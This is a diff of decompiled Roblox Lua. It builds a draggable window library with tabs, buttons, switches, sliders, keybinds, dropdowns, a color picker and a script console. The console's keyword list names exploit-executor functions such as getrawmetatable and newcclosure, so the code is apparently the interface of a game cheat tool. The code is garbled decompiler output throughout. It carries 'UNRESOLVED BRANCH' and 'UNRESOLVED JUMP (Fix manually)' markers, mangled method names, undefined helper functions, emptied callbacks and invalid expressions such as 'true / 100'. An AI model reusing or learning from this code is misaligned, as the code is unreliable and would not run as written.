+frame10.Parent = imageLabel20
+frame10.BackgroundColor3 = Color3.new(1, 1, 1)
+frame10.BorderSizePixel = 0
+frame10.Size = UDim2.new(0, 20, 0, 2)
+frame10.ZIndex = 2
+textButton4.Name = "Switch"
+textButton4.Parent = frame
+textButton4.BackgroundColor3 = Color3.new(1, 1, 1)
+textButton4.BackgroundTransparency = 1
+textButton4.BorderSizePixel = 0
+textButton4.Position = UDim2.new(0.229411766, 0, 0.20714286, 0)
+textButton4.Size = UDim2.new(0, 20, 0, 20)
+textButton4.ZIndex = 2
+textButton4.Font = Enum.Font.SourceSans
+textButton4.Text = ""
+textButton4.TextColor3 = Color3.new(1, 1, 1)
+textButton4.TextSize = 18
+imageLabel21.Name = "TextButton_Roundify_4px"
+imageLabel21.Parent = textButton4
+imageLabel21.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel21.BackgroundTransparency = 1
+imageLabel21.Size = UDim2.new(1, 0, 1, 0)
+imageLabel21.Image = "rbxassetid://2851929490"
+imageLabel21.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+imageLabel21.ImageTransparency = 0.5
+imageLabel21.ScaleType = Enum.ScaleType.Slice
+imageLabel21.SliceCenter = Rect.new(4, 4, 4, 4)
+textLabel16.Name = "Title"
+textLabel16.Parent = textButton4
+textLabel16.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel16.BackgroundTransparency = 1
+textLabel16.Position = UDim2.new(1.20000005, 0, 0, 0)
+textLabel16.Size = UDim2.new(0, 20, 0, 20)
+textLabel16.Font = Enum.Font.GothamSemibold
+textLabel16.Text = "Switch"
+textLabel16.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textLabel16.TextSize = 14
+textLabel16.TextXAlignment = Enum.TextXAlignment.Left
+textButton5.Name = "Button"
+textButton5.Parent = frame
+textButton5.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+textButton5.BackgroundTransparency = 1
+textButton5.BorderSizePixel = 0
+textButton5.Size = UDim2.new(0, 91, 0, 20)
+textButton5.ZIndex = 2
+textButton5.Font = Enum.Font.GothamSemibold
+textButton5.TextColor3 = Color3.new(1, 1, 1)
+textButton5.TextSize = 14
+imageLabel22.Name = "TextButton_Roundify_4px"
+imageLabel22.Parent = textButton5
+imageLabel22.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel22.BackgroundTransparency = 1
+imageLabel22.Size = UDim2.new(1, 0, 1, 0)
+imageLabel22.Image = "rbxassetid://2851929490"
+imageLabel22.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+imageLabel22.ScaleType = Enum.ScaleType.Slice
+imageLabel22.SliceCenter = Rect.new(4, 4, 4, 4)
+textButton6.Name = "DropdownButton"
+textButton6.Parent = frame
+textButton6.BackgroundColor3 = Color3.new(0.129412, 0.133333, 0.141176)
+textButton6.BorderSizePixel = 0
+textButton6.Size = UDim2.new(1, 0, 0, 20)
+textButton6.ZIndex = 3
+textButton6.Font = Enum.Font.GothamBold
+textButton6.Text = " Button"
+textButton6.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textButton6.TextSize = 14
+textButton6.TextXAlignment = Enum.TextXAlignment.Left
+imageLabel23.Name = "Keybind"
+imageLabel23.Parent = frame
+imageLabel23.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel23.BackgroundTransparency = 1
+imageLabel23.Size = UDim2.new(0, 200, 0, 20)
+imageLabel23.Image = "rbxassetid://2851929490"
+imageLabel23.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
+imageLabel23.ScaleType = Enum.ScaleType.Slice
+imageLabel23.SliceCenter = Rect.new(4, 4, 4, 4)
+textLabel17.Name = "Title"
+textLabel17.Parent = imageLabel23
+textLabel17.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel17.BackgroundTransparency = 1
+textLabel17.Size = UDim2.new(0, 0, 1, 0)
+textLabel17.Font = Enum.Font.GothamBold
+textLabel17.Text = "Keybind"
+textLabel17.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textLabel17.TextSize = 14
+textLabel17.TextXAlignment = Enum.TextXAlignment.Left
+textButton7.Name = "Input"
+textButton7.Parent = imageLabel23
+textButton7.BackgroundColor3 = Color3.new(1, 1, 1)
+textButton7.BackgroundTransparency = 1
+textButton7.BorderSizePixel = 0
+textButton7.Position = UDim2.new(1, -85, 0, 2)
+textButton7.Size = UDim2.new(0, 80, 1, -4)
+textButton7.ZIndex = 2
+textButton7.Font = Enum.Font.GothamSemibold
+textButton7.Text = "RShift"
+textButton7.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textButton7.TextSize = 12
+textButton7.TextWrapped = true
+imageLabel24.Name = "Input_Roundify_4px"
+imageLabel24.Parent = textButton7
+imageLabel24.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel24.BackgroundTransparency = 1
+imageLabel24.Size = UDim2.new(1, 0, 1, 0)
+imageLabel24.Image = "rbxassetid://2851929490"
+imageLabel24.ImageColor3 = Color3.new(0.290196, 0.294118, 0.313726)
+imageLabel24.ScaleType = Enum.ScaleType.Slice
+imageLabel24.SliceCenter = Rect.new(4, 4, 4, 4)
+frame11.Name = "Windows"
+frame11.Parent = screenGui
+frame11.BackgroundColor3 = Color3.new(1, 1, 1)
+frame11.BackgroundTransparency = 1
+frame11.Position = UDim2.new(0, 20, 0, 20)
+frame11.Size = UDim2.new(1, 20, 1, -20)
+script.Parent = screenGui
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local v2 = script.Parent:R82("Prefabs")
+local v3 = script.Parent:FindFirstChild("Windows")
+local config2 = {}
+config2["binding"] = false
+UserInputService.InputBegan:R85(function(p0, p1)
+    if typeof(config.toggle_key) == "EnumItem" then
+
+        if not (config.toggle_key) then
+        end
+
+        if p0.KeyCode == Enum.KeyCode.RightShift and script.Parent and not (config2.binding) then
+            script.Parent.Enabled = not script.Parent.Enabled
+        end
+
+        return
+
+    end
+end)
+local config3 = {}
+config3["FormatWindows"] = function(p0)
+    func_044287be()
+end
+local _upv0 = 0
+local _upv5 = Players.LocalPlayer:R81()
+config3["AddWindow"] = function(p0, p1, p2)
+    _upv0 = _upv0 + 1
+    -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+    -- [!] UNRESOLVED JUMP -> lbl_8 (Fix manually)
+
+    if typeof(p2) == "table" then
+
+        if not (p2) then
+            local v = config
+        end
+
+        v.tween_time = 0.1
+        local v2 = v2:FindFirstChild("Window"):Clone()
+        v2.Parent = v3
+        v2:FindFirstChild("Title").Text = tostring("New Window")
+        v2.Size = UDim2.new(0, v.min_size.X, 0, v.min_size.Y)
+        v2.ZIndex = v2.ZIndex + _upv0 * 10
+        v2:FindFirstChild("Title")
+        local v3 = v2:FindFirstChild("Bar")
+        v3:FindFirstChild("Toggle")
+        local _upv2 = v3:FindFirstChild("Base")
+        local _upv3 = v3:FindFirstChild("Top")
+        local _upv4 = v2:FindFirstChild("TabSelection"):FindFirstChild("Frame")
+
+        spawn(function(...)
+            while true do
+                v3.BackgroundColor3 = v.main_color
+                _upv2.BackgroundColor3 = v.main_color
+                _upv2.ImageColor3 = v.main_color
+                _upv3.ImageColor3 = v.main_color
+                _upv4.BackgroundColor3 = v.main_color
+                RunService.Heartbeat:Wait()
+            end
+        end)
+        local v4 = v2:WaitForChild("Resizer")
+        local config = {}
+        v2.Draggable = true
+        local v5 = _upv5.Icon
+        local v6 = false
+        v4.MouseEnter:Connect(function(...)
+            v2.Draggable = false
+
+            if v.can_resize then
+                v5 = _upv5.Icon
+            end
+
+            v6 = true
+        end)
+        v4.MouseLeave:Connect(function(...)
+            v6 = false
+
+            if v.can_resize then
+                _upv5.Icon = v5
+            end
+
+            v2.Draggable = true
+        end)
+        local v7 = false
+        UserInputService.InputBegan:Connect(function(p0)
+            if p0.UserInputType == Enum.UserInputType.MouseButton1 then
+                v7 = true
+
+                spawn(function(...)
+                    if v6 and v4.Active and v.can_resize then
+
+                        while true do
+
+                            if v7 and v4.Active then
+                                local v = func_0cb289c8()
+                                local v2 = v.X - v2.AbsolutePosition.X
+                                local v3 = v.Y - v2.AbsolutePosition.Y
+
+                                if v.min_size.X <= v2 then
+
+                                    if v.min_size.Y <= v3 then
+                                        func_7279f42e(v2, {
+                                            Size = UDim2.new(0, v2, 0, v3),
+                                        }, v.tween_time)
+                                    else
+                                        if v.min_size.X <= v2 then
+                                            func_7279f42e(v2, {
+                                                Size = UDim2.new(0, v2, 0, v.min_size.Y),
+                                            }, v.tween_time)
+                                        else
+                                            if v.min_size.Y <= v3 then
+                                                func_7279f42e(v2, {
+                                                    Size = UDim2.new(0, v.min_size.X, 0, v3),
+                                                }, v.tween_time)
+                                            else
+                                                func_7279f42e(v2, {
+                                                    Size = UDim2.new(0, v.min_size.X, 0, v.min_size.Y),
+                                                }, v.tween_time)
+                                            end
+                                        end
+                                    end
+
+                                    RunService.Heartbeat:Wait()
+                                end
+
+                                return
+
+                            end
+                        end
+                    end
+                end)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(p0)
+            if p0.UserInputType == Enum.UserInputType.MouseButton1 then
+                v7 = false
+            end
+        end)
+        local v8 = v2:FindFirstChild("Bar"):FindFirstChild("Toggle")
+        local config2 = {}
+        local _upv0 = true
+        local _upv1 = true
+        local _upv5 = v2.AbsoluteSize.Y
+        v8.MouseButton1Click:Connect(function(...)
+            if _upv0 then
+                _upv0 = false
+
+                if _upv1 then
+                    local config = {}
+                    config2 = config
+
+                    for v, v2 in next(v2:FindFirstChild("Tabs"):GetChildren) do
+                        config2[v2] = v2.Visible
+                        v2.Visible = false
+                    end
+
+                    v4.Active = false
+                    _upv5 = v2.AbsoluteSize.Y
+                    func_7279f42e(v8, {
+                        Rotation = 0,
+                    }, v.tween_time)
+                    local config3 = {}
+                    local v3 = 0
+                    config3.Size = UDim2.new(v3, v2.AbsoluteSize.X, 0, 26)
+                    local v4 = v.tween_time
+                    func_7279f42e(v2, config3, v4)
+                    v8.Parent:FindFirstChild("Base").Transparency = 1
+                else
+                    for v5, v6 in next(config2) do
+                        v5.Visible = v6
+                    end
+
+                    v4.Active = true
+                    func_7279f42e(v8, {
+                        Rotation = 90,
+                    }, v.tween_time)
+                    func_7279f42e(v2, {
+                        Size = UDim2.new(0, v2.AbsoluteSize.X, 0, _upv5),
+                    }, v.tween_time)
+                    v8.Parent:FindFirstChild("Base").Transparency = 0
+                end
+
+                _upv1 = not _upv1
+                wait(v.tween_time)
+                _upv0 = true
+            end
+        end)
+        local v9 = v2:FindFirstChild("TabSelection")
+        local v10 = "TabButtons"
+        local _upv2 = v9:FindFirstChild(v10)
+        local _upv5 = v2:FindFirstChild("Tabs")
+        local _upv6 = false
+        config.AddTab = function(p0, p1)
+            local config = {}
+            -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+            -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+            v9.Visible = true
+            local v = v2:FindFirstChild("TabButton"):Clone()
+            v.Parent = _upv2
+            v.Text = tostring("New Tab")
+            v.Size = UDim2.new(0, func_952739a8(v), 0, 20)
+            v.ZIndex = v.ZIndex + _upv0 * 10
+            v:GetChildren()[1].ZIndex = v:GetChildren()[1].ZIndex + _upv0 * 10
+            local v2 = v2:FindFirstChild("Tab"):Clone()
+            v2.Parent = _upv5
+            v2.ZIndex = v2.ZIndex + _upv0 * 10
+            v.MouseButton1Click:Connect(function()
+                func_8d8a9c57()
+            end)
+            config.Show = function(p0)
+                func_8d8a9c57()
+            end
+            config.AddLabel = function(p0, p1)
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_4 (Fix manually)
+                local v = v2:FindFirstChild("Label"):Clone()
+                v.Parent = v2
+                v.Text = tostring("New Label")
+                v.Size = UDim2.new(0, func_952739a8(v), 0, 20)
+                v.ZIndex = v.ZIndex + _upv0 * 10
+
+                return v
+            end
+            config.AddButton = function(p0, p1, p2)
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_4 (Fix manually)
+
+                if typeof(p2) == "function" then
+
+                    local v = v2:FindFirstChild("Button"):Clone()
+                    v.Parent = v2
+                    v.Text = tostring("New Button")
+                    v.Size = UDim2.new(0, func_952739a8(v), 0, 20)
+                    v.ZIndex = v.ZIndex + _upv0 * 10
+                    v:GetChildren()[1].ZIndex = v:GetChildren()[1].ZIndex + _upv0 * 10
+
+                    spawn(function()
+                        while true do
+
+                            if v and v:GetChildren()[1] then
+                                v:GetChildren()[1].ImageColor3 = v.main_color
+                            end
+
+                            RunService.Heartbeat:Wait()
+                        end
+                    end)
+                    v.MouseButton1Click:Connect(function()
+                        func_de519730(v, _upv5.X, _upv5.Y)
+                        pcall(function()
+                        end)
+                    end)
+
+                    return v
+
+                end
+            end
+            config.AddSwitch = function(p0, p1, p2)
+                local config = {}
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+
+                if typeof(p2) == "function" then
+
+                    local v = v2:FindFirstChild("Switch"):Clone()
+                    v.Parent = v2
+                    v:FindFirstChild("Title").Text = tostring("New Switch")
+                    v:FindFirstChild("Title").ZIndex = v:FindFirstChild("Title").ZIndex + _upv0 * 10
+                    v.ZIndex = v.ZIndex + _upv0 * 10
+                    v:GetChildren()[1].ZIndex = v:GetChildren()[1].ZIndex + _upv0 * 10
+
+                    spawn(function()
+                        while true do
+
+                            if v and v:GetChildren()[1] then
+                                v:GetChildren()[1].ImageColor3 = v.main_color
+                            end
+
+                            RunService.Heartbeat:Wait()
+                        end
+                    end)
+                    local v2 = false
+                    v.MouseButton1Click:Connect(function(...)
+                        v2 = not v2
+
+                        if v2 then
+
+                            v.Text = ""
+                            pcall(func_89fedad2, v2)
+
+                            return
+
+                        end
+                    end)
+                    config.Set = function(p0, p1)
+                        local v = typeof(p1)
+
+                        if v == "boolean" then
+                            -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                        else
+                        end
+
+                        v2 = false
+
+                        if v2 then
+
+                            v.Text = ""
+                            pcall(func_89fedad2, v2)
+
+                            return
+
+                        end
+                    end
+
+                    return config, v
+
+                end
+            end
+            config.AddTextBox = function(p0, p1, p2, p3)
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_4 (Fix manually)
+
+                if typeof(p2) == "function" and typeof(p3) == "table" then
+
+                    if not (p3) then
+                        local config = {}
+                        config.clear = true
+                    end
+
+                    local config2 = {}
+
+                    config2.clear = true
+                    local v = v2:FindFirstChild("TextBox"):Clone()
+                    v.Parent = v2
+                    v.PlaceholderText = tostring("New TextBox")
+                    v.ZIndex = v.ZIndex + _upv0 * 10
+                    v:GetChildren()[1].ZIndex = v:GetChildren()[1].ZIndex + _upv0 * 10
+                    v.FocusLost:Connect(function(p0)
+                        if p0 and 0 < #v.Text then
+                            pcall(function()
+                            end, v.Text)
+
+                            if config2.clear then
+                                v.Text = ""
+                            end
+                        end
+                    end)
+
+                    return v
+
+                end
+            end
+            config.AddSlider = function(p0, p1, p2, p3)
+                local config = {}
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+
+                if typeof(p2) == "function" and typeof(p3) == "table" then
+
+                    if not (p3) then
+                        local config2 = {}
+                        local v = config2
+                    end
+
+                    local config3 = {}
+
+                    config3.min = 0
+
+                    config3.max = 100
+
+                    config3.readonly = false
+                    local v2 = config3
+                    local v3 = v2:FindFirstChild("Slider"):Clone()
+                    v3.Parent = v2
+                    v3.ZIndex = v3.ZIndex + _upv0 * 10
+                    local v4 = v3:FindFirstChild("Title")
+                    local v5 = v3:FindFirstChild("Indicator")
+                    local v6 = v3:FindFirstChild("Value")
+                    v4.ZIndex = v4.ZIndex + _upv0 * 10
+                    v5.ZIndex = v5.ZIndex + _upv0 * 10
+                    v6.ZIndex = v6.ZIndex + _upv0 * 10
+                    v4.Text = tostring("New Slider")
+                    local v7 = false
+                    v3.MouseEnter:Connect(function(...)
+                        v7 = true
+                        v2.Draggable = false
+                    end)
+                    v3.MouseLeave:Connect(function(...)
+                        v7 = false
+                        v2.Draggable = true
+                    end)
+                    local v8 = false
+                    UserInputService.InputBegan:Connect(function(p0)
+                        if p0.UserInputType == Enum.UserInputType.MouseButton1 then
+                            v8 = true
+
+                            spawn(function(...)
+                                if v7 and not (v2.readonly) then
+
+                                    while true do
+
+                                        if v8 then
+
+                                            if not (_upv6) then
+                                                local v = v3.AbsoluteSize.X - v3.AbsoluteSize.X - func_0cb289c8().X - v3.AbsolutePosition.X + 1 / v3.AbsoluteSize.X
+                                                local v2 = 0
+                                                local v3 = 1
+
+                                                if v2 <= v then
+
+                                                    if v <= v3 then
+                                                    else
+                                                        if v < v2 then
+                                                        else
+                                                            if v3 < v then
+                                                                local v4 = v3
+                                                            end
+                                                        end
+                                                    end
+
+                                                    local config = {}
+                                                    -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                                                else
+                                                end
+
+                                                config.Size = UDim2.new(v2, 0, 0, 20)
+                                                func_7279f42e(v5, config, v.tween_time)
+                                                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                                            else
+                                            end
+
+                                            local v6 = v2.min
+                                            local v7 = math.floor(v2.max - v6 / 100 * math.floor(v2 * 100) + v6)
+                                            v6.Text = tostring(v7)
+                                            pcall(func_fd2d30b9, v7)
+                                            RunService.Heartbeat:Wait()
+                                        end
+                                    end
+                                end
+                            end)
+                        end
+                    end)
+                    UserInputService.InputEnded:Connect(function(p0)
+                        if p0.UserInputType == Enum.UserInputType.MouseButton1 then
+                            v8 = false
+                        end
+                    end)
+                    config.Set = function(p0, p1)
+                        -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                        -- [!] UNRESOLVED JUMP -> lbl_6 (Fix manually)
+                        local v = 0
+
+                        if 0 <= v then
+
+                            if v <= 100 then
+                            else
+                            end
+
+                            local v2 = true / 100
+                            local v3 = v5
+                            local config = {}
+                            -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                        else
+                        end
+
+                        config.Size = UDim2.new(0, 0, 0, 20)
+                        func_7279f42e(v3, config, v.tween_time)
+                        -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                        -- [!] UNRESOLVED JUMP -> lbl_36 (Fix manually)
+                        local v4 = v2.min
+                        local v5 = math.floor(v2.max - v4 / 100 * math.floor(0 * 100) + v4)
+                        v6.Text = tostring(v5)
+                        pcall(func_fd2d30b9, v5)
+                    end
+                    config:Set(v2.min)
+
+                    return config, v3
+
+                end
+            end
+            config.AddKeybind = function(p0, p1, p2, p3)
+                local config = {}
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+
+                if typeof(p2) == "function" and typeof(p3) == "table" then
+
+                    if not (p3) then
+                        local config2 = {}
+                    end
+
+                    local config3 = {}
+
+                    config3.standard = Enum.KeyCode.RightShift
+                    local v = config3
+                    local v2 = v2:FindFirstChild("Keybind"):Clone()
+                    local v3 = v2:FindFirstChild("Input")
+                    local v4 = v2:FindFirstChild("Title")
+                    v2.ZIndex = v2.ZIndex + _upv0 * 10
+                    v3.ZIndex = v3.ZIndex + _upv0 * 10
+                    v3:GetChildren()[1].ZIndex = v3:GetChildren()[1].ZIndex + _upv0 * 10
+                    v4.ZIndex = v4.ZIndex + _upv0 * 10
+                    v2.Parent = v2
+                    v4.Text = " " .. tostring("New Keybind")
+                    v2.Size = UDim2.new(0, func_952739a8(v4) + 80, 0, 20)
+                    local config4 = {}
+                    config4.RightControl = "RightCtrl"
+                    config4.LeftControl = "LeftCtrl"
+                    config4.LeftShift = "LShift"
+                    config4.RightShift = "RShift"
+                    config4.MouseButton1 = "Mouse1"
+                    config4.MouseButton2 = "Mouse2"
+                    local v5 = v.standard
+                    config.SetKeybind = function(p0, p1)
+                        v3.Text = p1.Name
+                        v5 = p1
+                    end
+                    UserInputService.InputBegan:Connect(function(p0, p1)
+                        if config2.binding then
+
+                            spawn(function()
+                                wait()
+                                config2.binding = false
+                            end)
+
+                            return
+
+                        end
+
+                        if p0.KeyCode == v5 and not (p1) then
+                            pcall(function()
+                            end, v5)
+                        end
+                    end)
+                    config:SetKeybind(v.standard)
+                    v3.MouseButton1Click:Connect(function(...)
+                        if config2.binding then
+
+                            return
+
+                        end
+
+                        v3.Text = "..."
+                        config2.binding = true
+                        local v, v2 = UserInputService.InputBegan:Wait()
+                        config:SetKeybind(v.KeyCode)
+                    end)
+
+                    return config, v5
+
+                end
+            end
+            config.AddDropdown = function(p0, p1, p2)
+                local config = {}
+                -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+
+                if typeof(p2) == "function" then
+
+                    local v = v2:FindFirstChild("Dropdown"):Clone()
+                    local v2 = v:FindFirstChild("Box")
+                    local v3 = v2:FindFirstChild("Objects")
+                    local v4 = v:FindFirstChild("Indicator")
+                    v.ZIndex = v.ZIndex + _upv0 * 10
+                    v2.ZIndex = v2.ZIndex + _upv0 * 10
+                    v3.ZIndex = v3.ZIndex + _upv0 * 10
+                    v4.ZIndex = v4.ZIndex + _upv0 * 10
+                    v:GetChildren()[3].ZIndex = v:GetChildren()[3].ZIndex + _upv0 * 10
+                    v.Parent = v2
+                    v.Text = " " .. tostring("New Dropdown")
+                    v2.Size = UDim2.new(1, 0, 0, 0)
+                    local v5 = false
+                    v.MouseButton1Click:Connect(function(...)
+                        v5 = not v5
+
+                        if 10 <= #v3:GetChildren() - 1 then
+                            v3.CanvasSize = UDim2.new(0, 0, #v3:GetChildren() - 1 * 0.1, 0)
+                        end
+
+                        if v5 then
+
+                            if _upv6 then
+
+                                return
+
+                            end
+
+                            _upv6 = true
+                            func_7279f42e(v2, {
+                                Size = UDim2.new(1, 0, 0, 200),
+                            }, v.tween_time)
+                            func_7279f42e(v4, {
+                                Rotation = 90,
+                            }, v.tween_time)
+                        else
+                            _upv6 = false
+                            func_7279f42e(v2, {
+                                Size = UDim2.new(1, 0, 0, 0),
+                            }, v.tween_time)
+                            func_7279f42e(v4, {
+                                Rotation = -90,
+                            }, v.tween_time)
+                        end
+                    end)
+                    config.Add = function(p0, p1)
+                        local config = {}
+                        -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+                        -- [!] UNRESOLVED JUMP -> lbl_5 (Fix manually)
+                        local v = tostring("New Object")
+                        local v2 = v2:FindFirstChild("DropdownButton"):Clone()
+                        v2.Parent = v3
+                        v2.Text = v
+                        v2.ZIndex = v2.ZIndex + _upv0 * 10
+                        v2.MouseEnter:Connect(function(...)
+                            v2.BackgroundColor3 = v.main_color
+                        end)
+                        v2.MouseLeave:Connect(function(...)
+                            v2.BackgroundColor3 = Color3.fromRGB(33, 34, 36)
+                        end)
+
+                        if v5 then
+
+                            if 10 <= #v3:GetChildren() - 1 then
+                                v3.CanvasSize = UDim2.new(0, 0, #v3:GetChildren() - 1 * 0.1, 0)
+                            end
+
+                            func_7279f42e(v2, {
+                                Size = UDim2.new(1, 0, 0, 200),
+                            }, v.tween_time)
+                        end
+
+                        v2.MouseButton1Click:Connect(function(...)
+                            if _upv6 then
+                                v.Text = " [ " .. v .. " ]"
+                                _upv6 = false
+                                v5 = false
+                                func_7279f42e(v2, {
+                                    Size = UDim2.new(1, 0, 0, 0),
+                                }, v.tween_time)
+                                func_7279f42e(v4, {
+                                    Rotation = -90,
+                                }, v.tween_time)
+                                pcall(function()
+                                end, v)
+                            end
+                        end)
+                        config.Remove = function(p0)
+                            v2:Destroy()
+                        end
+
+                        return config, config
+                    end
+                    config.Clear = function(p0)
+                        for v, v2 in next(v3:GetChildren) do
+
+                            if v2:IsA("TextButton") then
+                                v2:Destroy()
+                            end
+                        end
+                    end
+
+                    return config, v
+
+                end
+            end
+            config.AddColorPicker = function(p0, p1)
+                local config = {}
+
+                if typeof(p1) == "function" then
+
+                    local v = v2:FindFirstChild("ColorPicker"):Clone()
+                    v.Parent = v2
+                    v.ZIndex = v.ZIndex + _upv0 * 10
+                    local v2 = v:FindFirstChild("Palette")
+                    local v3 = v:FindFirstChild("Sample")
+                    local v4 = v:FindFirstChild("Saturation")
+                    v2.ZIndex = v2.ZIndex + _upv0 * 10
+                    v3.ZIndex = v3.ZIndex + _upv0 * 10
+                    v4.ZIndex = v4.ZIndex + _upv0 * 10
+                    local v5 = 0
+                    local v6 = 1
+                    local v7 = 1
+                    v3.ImageColor3 = Color3.fromHSV(v5, v6, v7)
+                    v4.ImageColor3 = Color3.fromHSV(v5, 1, 1)
+                    local v8 = false
+                    local v9 = false
+                    v2.MouseEnter:Connect(function(...)
+                        v2.Draggable = false
+                        v8 = true
+                    end)
+                    v2.MouseLeave:Connect(function(...)
+                        v2.Draggable = true
+                        v8 = false
+                    end)
+                    v4.MouseEnter:Connect(function(...)
+                        v2.Draggable = false
+                        v9 = true
+                    end)
+                    v4.MouseLeave:Connect(function(...)
+                        v2.Draggable = true
+                        v9 = false
+                    end)
+                    local v10 = v2:FindFirstChild("Indicator")
+                    local v11 = v4:FindFirstChild("Indicator")
+                    v10.ZIndex = v10.ZIndex + _upv0 * 10
+                    v11.ZIndex = v11.ZIndex + _upv0 * 10
+                    local v12 = false
+                    UserInputService.InputBegan:Connect(function(p0)
+                        if p0.UserInputType == Enum.UserInputType.MouseButton1 then
+                            v12 = true
+
+                            spawn(function(...)
+                                while true do
+
+                                    if v12 and v8 and not (_upv6) then
+                                        local v = func_0cb289c8()
+                                        local v2 = v2.AbsoluteSize.X - v.X - v2.AbsolutePosition.X + 1
+                                        local v3 = v2.AbsoluteSize.Y - v.Y - v2.AbsolutePosition.Y + 1.5
+                                        Color3.fromHSV(v2 / 100, v3 / 100, 0)
+                                        v5 = v2 / 100
+                                        v6 = v3 / 100
+                                        func_7279f42e(v10, {
+                                            Position = UDim2.new(0, math.abs(v2 - 100) - v10.AbsoluteSize.X / 2, 0, math.abs(v3 - 100) - v10.AbsoluteSize.Y / 2),
+                                        }, v.tween_time)
+                                        func_2f357391()
+                                        RunService.Heartbeat:Wait()
+                                    end
+                                end
+
+                                while true do
+
+                                    if v12 and v9 and not (_upv6) then
+                                        local v4 = v2.AbsoluteSize.Y - func_0cb289c8().Y - v2.AbsolutePosition.Y + 1.5
+                                        v7 = v4 / 100
+                                        func_7279f42e(v11, {
+                                            Position = UDim2.new(0, 0, 0, math.abs(v4 - 100)),
+                                        }, v.tween_time)
+                                        func_2f357391()
+                                        RunService.Heartbeat:Wait()
+                                    end
+                                end
+                            end)
+                        end
+                    end)
+                    UserInputService.InputEnded:Connect(function(p0)
+                        if p0.UserInputType == Enum.UserInputType.MouseButton1 then
+                            v12 = false
+                        end
+                    end)
+                    config.Set = function(p0, p1)
+                        if typeof(p1) == "Color3" then
+
+                            if not (p1) then
+                                local v = Color3.new(1, 1, 1)
+                            end
+
+                            local v2, v3, v4 = func_bceddfab(v.r * 255, v.g * 255, v.b * 255)
+                            v3.ImageColor3 = v
+                            v4.ImageColor3 = Color3.fromHSV(v2, 1, 1)
+                            pcall(func_902daba1, v)
+
+                            return
+
+                        end
+                    end
+
+                    return config, v
+
+                end
+            end
+            config.AddConsole = function(p0, p1)
+                local config = {}
+
+                if typeof(p1) == "table" then
+
+                    if not (p1) then
+                        local v = {
+                            readonly = true,
+                            full = false,
+                        }
+                    end
+
+                    local config3 = {}
+
+                    config3.y = 200
+
+                    config3.source = "Logs"
+
+                    config3.readonly = true
+
+                    config3.full = true
+                    local v2 = config3
+                    local v3 = v2:FindFirstChild("Console"):Clone()
+                    v3.Parent = v2
+                    v3.ZIndex = v3.ZIndex + _upv0 * 10
+
+                    if v2.full then
+
+                        v3.Size = UDim2.new(1, 0, 0, v2.y)
+                        local v4 = v3:GetChildren()[1]
+                        local v5 = v4:FindFirstChild("Source")
+                        local v6 = v4:FindFirstChild("Lines")
+                        v5.ZIndex = v5.ZIndex + _upv0 * 10
+                        v6.ZIndex = v6.ZIndex + _upv0 * 10
+                        v5.TextEditable = not v2.readonly
+
+                        for v7, v8 in next(v5:GetChildren) do
+                            v8.ZIndex = v8.ZIndex + _upv0 * 10 + 1
+                        end
+
+                        v5.Comments.ZIndex = v5.Comments.ZIndex + 1
+                        local config4 = {
+                            "and",
+                            "break",
+                            "do",
+                            "else",
+                            "elseif",
+                            "end",
+                            "false",
+                            "for",
+                            "function",
+                            "goto",
+                            "if",
+                            "in",
+                            "local",
+                            "nil",
+                            "not",
+                            "or",
+                            "repeat",
+                            "return",
+                            "then",
+                            "true",
+                            "until",
+                            "while",
+                        }
+                        local config5 = {
+                            "getrawmetatable",
+                            "newcclosure",
+                            "islclosure",
+                            "setclipboard",
+                            "game",
+                            "workspace",
+                            "script",
+                            "math",
+                            "string",
+                            "table",
+                            "print",
+                            "wait",
+                            "BrickColor",
+                            "Color3",
+                            "next",
+                            "pairs",
+                            "ipairs",
+                            "select",
+                            "unpack",
+                            "Instance",
+                            "Vector2",
+                            "Vector3",
+                            "CFrame",
+                            "Ray",
+                            "UDim2",
+                            "Enum",
+                            "assert",
+                            "error",
+                            "warn",
+                            "tick",
+                            "loadstring",
+                            "_G",
+                            "shared",
+                            "getfenv",
+                            "setfenv",
+                            "newproxy",
+                            "setmetatable",
+                            "getmetatable",
+                            "os",
+                            "debug",
+                            "pcall",
+                            "ypcall",
+                            "xpcall",
+                            "rawequal",
+                            "rawset",
+                            "rawget",
+                            "tonumber",
+                            "tostring",
+                            "type",
+                            "typeof",
